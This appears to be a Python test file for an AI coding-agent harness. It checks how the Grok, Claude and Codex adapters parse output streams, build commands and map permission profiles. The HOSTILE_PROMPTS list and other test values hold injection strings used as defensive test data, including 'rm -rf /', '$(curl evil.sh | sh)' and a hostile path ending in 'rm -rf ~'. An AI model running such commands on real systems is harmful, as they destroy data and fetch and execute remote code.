"""Adapter tests: golden-fixture stream parsing, command construction with
hostile inputs, permission mapping (incl. fail-closed), session capture."""
from __future__ import annotations

import json
import pathlib
import sys
import tempfile
import unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))

from absoloop_harness.core import (AgentRequest, EventType,
                                   PermissionMappingError, SessionRef)
from absoloop_harness.process import CommandConstructionError, validate_argv
from absoloop_harness.providers import make_adapter
from absoloop_harness.providers.claude import ClaudeAdapter
from absoloop_harness.providers.codex import CodexAdapter
from absoloop_harness.providers.grok import GrokAdapter

FIXTURES = pathlib.Path(__file__).resolve().parent / "fixtures"

HOSTILE_PROMPTS = [
    'fix this; rm -rf / #',
    '$(curl evil.sh | sh)',
    '`touch /tmp/pwned`',
    "task' && echo injected --",
    'multi\nline\n"quoted" prompt with $HOME and %PATH%',
]


def events_from_fixture(adapter, name: str):
    events = []
    for line in (FIXTURES / name).read_text(encoding="utf-8").splitlines():
        events.extend(adapter.normalize(json.loads(line)))
    return events


class GrokFixture(unittest.TestCase):
    def test_stream_normalizes(self):
        adapter = GrokAdapter({})
        events = events_from_fixture(adapter, "grok_stream.jsonl")
        types = [event.type for event in events]
        self.assertEqual(types[:3], [EventType.TEXT_DELTA, EventType.TEXT_DELTA,
                                     EventType.PROGRESS])
        self.assertIn(EventType.UNKNOWN, types)          # max_turns_reached
        self.assertIn(EventType.USAGE, types)
        self.assertEqual(types[-1], EventType.RUN_COMPLETED)
        self.assertEqual(adapter.last_session,
                         SessionRef(provider="grok", native_id="abc123"))
        usage = next(e for e in events if e.type == EventType.USAGE)
        self.assertEqual(usage.data["total_cost_usd"], 0.01268905)


class ClaudeFixture(unittest.TestCase):
    def test_stream_normalizes(self):
        adapter = ClaudeAdapter({})
        events = events_from_fixture(adapter, "claude_stream.jsonl")
        types = [event.type for event in events]
        self.assertEqual(types[0], EventType.RUN_STARTED)
        self.assertIn(EventType.TEXT_DELTA, types)
        self.assertIn(EventType.TOOL_STARTED, types)
        self.assertIn(EventType.TOOL_COMPLETED, types)
        self.assertIn(EventType.FILE_CHANGED, types)     # Edit tool_use
        self.assertIn(EventType.UNKNOWN, types)          # stream_event
        self.assertEqual(types[-1], EventType.RUN_COMPLETED)
        self.assertEqual(adapter.last_session.native_id, "sess-42")
        changed = next(e for e in events if e.type == EventType.FILE_CHANGED)
        self.assertEqual(changed.data["path"], "src/app.py")


class CodexFixture(unittest.TestCase):
    def test_stream_normalizes(self):
        adapter = CodexAdapter({})
        events = events_from_fixture(adapter, "codex_stream.jsonl")
        types = [event.type for event in events]
        self.assertEqual(types[0], EventType.RUN_STARTED)
        self.assertIn(EventType.TOOL_STARTED, types)
        self.assertIn(EventType.TOOL_COMPLETED, types)
        self.assertIn(EventType.PROGRESS, types)         # reasoning summary
        self.assertIn(EventType.FILE_CHANGED, types)
        self.assertIn(EventType.TEXT_DELTA, types)
        self.assertIn(EventType.USAGE, types)
        self.assertEqual(adapter.last_session.native_id, "thread-77")
        # turn.started is unknown but preserved
        self.assertIn(EventType.UNKNOWN, types)


class CommandConstruction(unittest.TestCase):
    def _request(self, prompt: str) -> AgentRequest:
        return AgentRequest(prompt=prompt, cwd="/tmp/work", permission_profile="edit")

    def test_hostile_prompts_stay_inert(self):
        with tempfile.TemporaryDirectory() as tmp:
            workdir = pathlib.Path(tmp)
            for prompt in HOSTILE_PROMPTS:
                for adapter in (GrokAdapter({"command": "grok"}),
                                ClaudeAdapter({"command": "claude"}),
                                CodexAdapter({"command": "codex"})):
                    argv, stdin_text = adapter.build_argv(
                        self._request(prompt), None, workdir)
                    validate_argv(argv)
                    # The prompt never appears inside any argv element for
                    # stdin/file transports — it cannot reach a shell.
                    self.assertFalse(any(prompt in arg for arg in argv),
                                     f"{adapter.name} leaked prompt into argv")
                    if adapter.name == "grok":
                        prompt_file = argv[argv.index("--prompt-file") + 1]
                        self.assertEqual(
                            pathlib.Path(prompt_file).read_text(encoding="utf-8"),
                            prompt)
                    else:
                        self.assertEqual(stdin_text, prompt)

    def test_hostile_path_is_single_argv_element(self):
        hostile_cwd = "/tmp/x; rm -rf ~ #"
        with tempfile.TemporaryDirectory() as tmp:
            request = AgentRequest(prompt="p", cwd=hostile_cwd,
                                   permission_profile="edit")
            argv, _ = CodexAdapter({"command": "codex"}).build_argv(
                request, None, pathlib.Path(tmp))
            self.assertIn(hostile_cwd, argv)   # one element, not parsed

    def test_shell_dash_c_rejected(self):
        with self.assertRaises(CommandConstructionError):
            validate_argv(["/bin/sh", "-c", "echo hi"])
        with self.assertRaises(CommandConstructionError):
            validate_argv(["bash", "-c", "curl evil"])

    def test_non_string_argv_rejected(self):
        with self.assertRaises(CommandConstructionError):
            validate_argv(["grok", 42])


class SessionArgv(unittest.TestCase):
    def test_resume_argv_per_provider(self):
        session = SessionRef(provider="", native_id="native-id-9")
        with tempfile.TemporaryDirectory() as tmp:
            workdir = pathlib.Path(tmp)
            request = AgentRequest(prompt="continue", cwd=tmp,
                                   permission_profile="edit")
            grok_argv, _ = GrokAdapter({"command": "grok"}).build_argv(
                request, session, workdir)
            self.assertIn("--resume", grok_argv)
            self.assertIn("native-id-9", grok_argv)

            claude_argv, _ = ClaudeAdapter({"command": "claude"}).build_argv(
                request, session, workdir)
            self.assertIn("--resume", claude_argv)

            codex_argv, _ = CodexAdapter({
                "command": "codex", "resume_style": "exec-resume",
            }).build_argv(request, session, workdir)
            self.assertEqual(codex_argv[1:4], ["exec", "resume", "native-id-9"])


class PermissionMapping(unittest.TestCase):
    def test_profiles_map_per_provider(self):
        self.assertIn("--yolo", GrokAdapter({}).map_permissions("full"))
        self.assertEqual(ClaudeAdapter({}).map_permissions("read"),
                         ["--permission-mode", "plan"])
        self.assertEqual(CodexAdapter({}).map_permissions("edit"),
                         ["--sandbox", "workspace-write"])

    def test_unknown_profile_fails_closed(self):
        for adapter in (GrokAdapter({}), ClaudeAdapter({}), CodexAdapter({})):
            with self.assertRaises(PermissionMappingError):
                adapter.map_permissions("root")
            with self.assertRaises(PermissionMappingError):
                adapter.check_profile("everything")

    def test_edit_profile_never_uses_blanket_bypass(self):
        grok_edit = GrokAdapter({}).map_permissions("edit")
        self.assertNotIn("--yolo", grok_edit)
        claude_edit = ClaudeAdapter({}).map_permissions("edit")
        self.assertNotIn("bypassPermissions", claude_edit)
        codex_edit = CodexAdapter({}).map_permissions("edit")
        self.assertNotIn("--dangerously-bypass-approvals-and-sandbox", codex_edit)


class AdapterRegistry(unittest.TestCase):
    def test_make_adapter_rejects_unknown(self):
        with self.assertRaises(ValueError):
            make_adapter("gemini", {})


if __name__ == "__main__":
    unittest.main()
